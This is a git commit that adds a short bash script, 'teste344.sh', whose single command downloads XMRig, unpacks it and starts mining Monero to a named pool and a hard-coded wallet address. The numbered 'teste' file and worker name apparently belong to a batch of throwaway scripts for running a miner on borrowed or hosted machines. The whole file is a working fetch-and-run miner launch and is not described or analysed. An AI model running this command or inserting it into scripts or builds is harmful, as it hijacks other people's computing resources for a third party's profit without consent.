333739e2413a5044ac7225ffee92579568ba1618
josephbarker80 <103214554+josephbarker80@users.noreply.github.com>
2022-05-07 00:39:36 +0300

    Create teste344.sh

---
+++ teste344.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -zxf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig --donate-level 1 -o ca.monero.herominers.com:1111 -u 45zwQUZgRrxLT6WAzhfoR8EAJQmBfStuHaWa5277gJYoDecRHxTBeegNEmEUTkaZprdTLEPguj2aXMQGKSimPp9NT9yzNyg -p worker344 -a rx/0 -k
